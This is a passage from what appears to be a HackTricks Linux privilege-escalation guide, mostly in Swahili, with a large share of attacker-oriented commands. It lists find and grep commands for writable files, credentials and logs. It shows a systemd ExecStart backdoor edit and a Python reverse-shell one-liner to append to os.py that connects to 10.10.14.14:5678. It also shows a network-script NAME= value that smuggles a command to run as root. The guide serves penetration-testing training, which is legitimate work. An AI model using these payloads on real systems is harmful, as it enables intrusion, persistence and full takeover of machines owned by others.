```
Kumbuka: Katika majukwaa ya BSD `/etc/passwd` iko katika `/etc/pwd.db` na `/etc/master.passwd`, pia `/etc/shadow` imebadilishwa jina kuwa `/etc/spwd.db`.

Unapaswa kuangalia ikiwa unaweza **kuandika kwenye baadhi ya faili nyeti**. Kwa mfano, unaweza kuandika kwenye **service configuration file**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Kwa mfano, ikiwa mashine inaendesha seva ya **tomcat** na unaweza **kubadilisha faili ya usanidi ya huduma ya Tomcat ndani ya /etc/systemd/,** basi unaweza kubadilisha mistari:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Backdoor yako itaendeshwa mara ijayo tomcat itakapozinduliwa.

### Kagua Folda

Folda zifuatazo zinaweza kuwa na chelezo au taarifa za kuvutia: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Pengine hautaweza kusoma ile ya mwisho, lakini jaribu)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Eneo la Ajabu/Owned mafayela
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Faili zilizobadilishwa katika dakika za hivi karibuni
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Mafaili ya Sqlite DB
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml mafayela
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Faili zilizofichwa
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries katika PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Faili za wavuti**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Chelezo**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Faili zinazojulikana zenye nywila

Soma msimbo wa [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), inatafuta **faili kadhaa zinazowezekana ambazo zinaweza kuwa na nywila**.\
**Chombo kingine cha kuvutia** unachoweza kutumia kufanya hivyo ni: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) ambacho ni programu ya chanzo wazi inayotumika kupata nywila nyingi zilizohifadhiwa kwenye kompyuta ya ndani kwa Windows, Linux & Mac.

### Logs

Kama unaweza kusoma logs, unaweza kupata **taarifa za kuvutia/zinazo siri ndani yao**. Kama log ni ya kushangaza zaidi, ndivyo itakavyokuwa ya kuvutia zaidi (labda).\
Pia, baadhi ya **mbaya** zilizosanikishwa vibaya (backdoored?) **audit logs** zinaweza kukuruhusu **kurekodi nywila** ndani ya audit logs kama ilivyoelezwa katika chapisho hiki: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Ili **kusoma logi kikundi** [**adm**](interesting-groups-linux-pe/index.html#adm-group) kitakuwa msaada sana.

### Shell faili
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Unapaswa pia kuangalia faili zenye neno "**password**" katika **jina** au ndani ya **maudhui**, na pia angalia IPs na emails ndani ya logs, au regexps za hashes.  
Sitasema hapa jinsi ya kufanya yote haya lakini ikiwa una nia unaweza kuangalia ukaguzi wa mwisho ambao [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) perform.

## Faili zinazoweza kuandikwa

### Python library hijacking

Ikiwa unajua kutoka **wapi** script ya python itakayotekelezwa na unaweza **kuandika ndani** ya folda hiyo au unaweza **modify python libraries**, unaweza kubadilisha OS library na backdoor it (ikiwa unaweza kuandika mahali ambapo python script itakayotekelezwa, copy and paste maktaba ya os.py).

To **backdoor the library** ongeza tu mwishoni mwa maktaba ya os.py mstari ufuatao (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

Udhaifu katika `logrotate` unamruhusu watumiaji wenye **idhini ya kuandika** kwenye faili ya logi au saraka zake za mzazi kupata uwezo wa kupandishwa wa privileges. Hii ni kwa sababu `logrotate`, mara nyingi ikikimbia kama **root**, inaweza kuchezwa ili kutekeleza faili yoyote, hasa katika saraka kama _**/etc/bash_completion.d/**_. Ni muhimu kukagua ruhusa si tu katika _/var/log_ bali pia katika saraka yoyote ambapo rotation ya logi inatumika.

> [!TIP]
> Udhaifu huu unahusu `logrotate` toleo `3.18.0` na zile za zamani

Maelezo ya kina kuhusu udhaifu yanaweza kupatikana kwenye ukurasa huu: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Unaweza kutumia udhaifu huu kwa [**logrotten**](https://github.com/whotwagner/logrotten).

Udhaifu huu ni sawa sana na [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** hivyo kila utakapo gundua unaweza kubadilisha logs, angalia nani anayesimamia logs hizo na uhakiki kama unaweza kupandisha privileges kwa kubadilisha logs kwa symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Ikiwa, kwa sababu yoyote, mtumiaji anaweza **kuandika** script ya `ifcf-<whatever>` kwenye _/etc/sysconfig/network-scripts_ **au** anaweza **kurekebisha** ile iliyopo, basi mfumo wako ume **pwned**.

Network scripts, kwa mfano _ifcg-eth0_, hutumiwa kwa muunganisho wa mtandao. Zinawoneka sawa kabisa na faili za .INI. Hata hivyo, zinakuwa \~sourced\~ kwenye Linux na Network Manager (dispatcher.d).

Kwasema kwangu, thamani ya `NAME=` katika script hizi za mtandao haishughulikiwa ipasavyo. Ikiwa una nafasi nyeupe/blank katika jina, mfumo unajaribu kutekeleza sehemu iliyofuata baada ya nafasi hiyo. Hii inamaanisha kwamba **kila kitu baada ya nafasi ya kwanza kinatekelezwa kama root**.

Kwa mfano: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Kumbuka nafasi tupu kati ya Network na /bin/id_)

### **init, init.d, systemd, and rc.d**

The directory `/etc/init.d` is home to **scripts** for System V init (SysVinit), the **classic Linux service management system**. It includes scripts to `start`, `stop`, `restart`, and sometimes `reload` services. These can be executed directly or through symbolic links found in `/etc/rc?.d/`. An alternative path in Redhat systems is `/etc/rc.d/init.d`.

On the other hand, `/etc/init` is associated with **Upstart**, a newer **service management** introduced by Ubuntu, using configuration files for service management tasks. Despite the transition to Upstart, SysVinit scripts are still utilized alongside Upstart configurations due to a compatibility layer in Upstart.

**systemd** emerges as a modern initialization and service manager, offering advanced features such as on-demand daemon starting, automount management, and system state snapshots. It organizes files into `/usr/lib/systemd/` for distribution packages and `/etc/systemd/system/` for administrator modifications, streamlining the system administration process.

## Mbinu Nyingine

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Kutoroka kutoka restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks commonly hook a syscall to expose privileged kernel functionality to a userspace manager. Weak manager authentication (e.g., signature checks based on FD-order or poor password schemes) can enable a local app to impersonate the manager and escalate to root on already-rooted devices. Learn more and exploitation details here:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Kinga za Usalama za Kernel

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Msaada zaidi

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Chombo bora kutafuta Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Marejeleo

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
